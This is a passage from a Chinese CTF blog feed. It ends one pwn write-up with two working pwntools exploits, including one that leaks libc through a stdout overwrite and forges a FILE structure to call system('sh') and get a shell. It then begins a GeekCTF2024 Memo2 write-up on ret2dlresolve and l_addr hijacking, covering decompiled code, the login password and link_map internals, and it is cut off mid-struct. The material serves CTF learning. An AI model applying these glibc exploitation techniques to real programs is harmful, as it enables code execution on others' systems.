p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x88</span>: p64(libc_base + <span class="number">0x21ca70</span>),  <span class="comment"># _lock</span></span><br><span class="line">    <span class="number">0xa0</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]),</span><br><span class="line">    <span class="number">0xd8</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] + <span class="number">0x10</span>),</span><br><span class="line">    <span class="number">0xe0</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]-<span class="number">8</span>),</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *$rebase(0x12E3)&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">edit(-<span class="number">4</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x5d</span>+fake_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>然后Qanux师傅给出了一个利用stdout泄露libc的非预期：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#         env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># p=remote(&#x27;node5.buuoj.cn&#x27;,29746)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./prob&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, msg</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index:&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;msg:&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    p.sendline(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cry</span>):</span><br><span class="line">    ans = cry</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        ans = (ans &gt;&gt; <span class="number">12</span>) ^ cry</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">    <span class="comment">#             env=&#123;&quot;LD_PRELOAD&quot;: &quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">    p = process(<span class="string">&#x27;./prob&#x27;</span>)</span><br><span class="line">    edit(-<span class="number">4</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x5d</span>+p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>), timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hex</span>(leak)[-<span class="number">2</span>] != <span class="string">&#x27;2&#x27;</span> <span class="keyword">or</span> <span class="built_in">hex</span>(leak)[-<span class="number">1</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> <span class="built_in">hex</span>(leak)[-<span class="number">3</span>] != <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;leak libc error&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">    libc_base = leak - <span class="number">0x219B20</span></span><br><span class="line">    lg(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">    fake_file = flat(&#123;</span><br><span class="line">        <span class="number">0x0</span>: <span class="string">b&#x27;  sh;&#x27;</span>,</span><br><span class="line">        <span class="number">0x8</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x10</span>),</span><br><span class="line">        <span class="number">0x28</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]),</span><br><span class="line"></span><br><span class="line">        <span class="number">0x88</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>),</span><br><span class="line">        <span class="number">0xa0</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x40</span>),</span><br><span class="line">        <span class="number">0xd8</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] - <span class="number">0x20</span>),</span><br><span class="line">    &#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">    edit(-<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x5d</span>+fake_file)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="0x03-User-management"><a href="#0x03-User-management" class="headerlink" title="0x03 User_management"></a>0x03 User_management</h3>]]></content>
    
    
    <summary type="html">非常好国际比赛，使我记忆恢复。</summary>
    
    
    
    <category term="WP" scheme="https://c-lby.top/categories/WP/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>『ret2dlresolve』hijack l_addr(GeekCTF2024 Memo2)</title>
    <link href="https://c-lby.top/2024/06/25/ret2dl-hijack-l-addr/"/>
    <id>https://c-lby.top/2024/06/25/ret2dl-hijack-l-addr/</id>
    <published>2024-06-25T13:02:11.000Z</published>
    <updated>2024-06-30T06:48:48.725Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>本来这篇文章想5月份写的，拖到了现在。其实是之前在VN面试的时候Qanux师傅给我做的几道题里的其中一道要用到这个技术，也是第一次见，所以打算记录一下。后来题目做了三天，才发现是24年geekCTF的memo2。接下来就从这道题讲讲劫持l_addr绕过栈溢出检测或者getshell的思路，以及调试方法。</p><h3 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_1614(a1, a2, a3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;===================Memo Login===================&quot;</span>);</span><br><span class="line">  login();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_195C() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        v4 += sub_185B(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(qword_4130);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        sub_18CC(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        v4 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(qword_4130, <span class="number">0</span>, <span class="number">0x2000</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        sub_1A19(v4);</span><br><span class="line">        _exit(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error Choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">sub_1614</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  qword_4130 = (<span class="type">char</span> *)mmap(<span class="number">0LL</span>, <span class="number">0x2000</span>uLL, <span class="number">3</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_4130 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span>(qword_4130, <span class="number">0</span>, <span class="number">0x2000</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里申请了一块mmap地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">login</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *s1; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%29s&quot;</span>, s);</span><br><span class="line">  v0 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  s1 = (<span class="type">void</span> *)sub_1349(s, v0);</span><br><span class="line">  <span class="keyword">if</span> ( !s1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(s2);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(s1, s2, v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Password Error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Login Success!&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(s1);</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的password在IDA里解密base64（这个base64应该很好识别，看不出来的话找逆向手吧）的话，会得到错误的结果（IDA的问题），所以要通过动调来获得正确的密文，再解密为密码，是<code>CTF_is_interesting_isn0t_it?</code>。（密文查看命令：<code>tele $rebase(0x40C0)</code>)</p><p>其他地方没什么漏洞，我们直接看case5的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1A19</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+1Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where would you like to sign(after the content): &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( qword_4130[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You will overwrite some content: &quot;</span>);</span><br><span class="line">    write(<span class="number">1</span>, &amp;qword_4130[v1], <span class="number">8uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">  sub_17E9(src, <span class="number">80LL</span>);</span><br><span class="line">  <span class="built_in">strncpy</span>(&amp;qword_4130[v1], src, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个神奇的漏洞，程序以无符号int格式输入了一个数到int变量里，也就是那个v1。接着程序以v1为前面申请的mmap那块地址的下标，先读取8字节，然后写入16字节。很容易发现这里src是存在栈溢出漏洞的，但是程序开启了canary。也很容易发现这里有下标越界的漏洞，并且因为v1变量是int类型的，所以既可以向前也可以向后越界进行限定字节数的任意读写。</p><h3 id="0x02-尝试过但无果的思路"><a href="#0x02-尝试过但无果的思路" class="headerlink" title="0x02 尝试过但无果的思路"></a>0x02 尝试过但无果的思路</h3><ol><li>因为程序开了canary，肯定不能直接rop。既然有下标越界，第一时间想到的是劫持tls结构体。但是虽然这样就能泄露canary了，但是没法泄露libc地址。如果选择在tls结构体内泄露libc地址的话，很遗憾的是，没有办法修改canary的值，因为tls结构体中libc地址与canary值距离32个字节，所以这个思路是行不通的。</li><li>exit hook肯定打不了，因为程序直接_exit()退出了。</li><li>下标直接打到栈上，实现不了因为数字太大了。</li><li>无法劫持IO的路子，因为读写字节数不够用。</li><li>无法劫持libc的got表。原本尝试劫持stack_chk_fail的，但是只一个got表函数的话没法满足ogg条件，如果要劫持两个got表函数，需要这两个函数挨在一起，因为程序只能连续写16字节，很可惜找不到这样的gadget，所以行不通。</li></ol><h3 id="正确思路"><a href="#正确思路" class="headerlink" title="正确思路"></a>正确思路</h3><p>所以这里考虑ret2dlresolve。这个技术涉及比较多的情况和知识点，这篇文章只是针对其中一种网上比较少提及的劫持方法。这个思路来源，其实是因为那块mmap地址，我们在2.35的本地环境下（应该和靶机是不一样的）用vmmap看一下那块地址的位置：<img src="https://c-lby.top/images/ret2dl-hijack-l-addr/vmmap.png" alt="vmmap">不难发现mmap地址被加载在了libc和ld之间，那么我们通过下标就能很方便的打到ld。</p><p>之前在研究<a href="https://c-lby.top/2024/05/15/glibc-exit-hook/#dl-fini">exit hook</a>源码的时候提过一嘴，ld负责将与程序有关的文件（模块）映射到进程空间中，然后将相关记录存到<code>__rtld_global</code>中。再准确一点，他们被记录在了<code>struct link_map *_ns_loaded;</code>中。每个模块用_ns_loaded描述, 这个命名空间中所映射的模块组成一个双向链表, _ns_loaded就是这个链表的指针。我们回顾一下link_map结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"><span class="comment">//模块的基地址</span></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* Difference between the address in the ELF file and the addresses in memory.  */</span> <span class="comment">//模块的基地址</span></span><br><span class="line">    <span class="type">char</span> *l_name;<span class="comment">/* Absolute file name object was found in.  */</span> <span class="comment">//模块的文件名</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* Dynamic section of the shared object.  */</span> <span class="comment">//指向elf的dyn节</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns; <span class="comment">//模块所属命名空间的idx</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">      l_info是ELF节描述符组成的的数组</span></span><br><span class="line"><span class="comment">      ELF中一个节, 使用一个ElfW(Dyn)描述</span></span><br><span class="line"><span class="comment">      各个类型的节在l_info中的下标固定, 因此可以通过下标来区分节的类型</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + 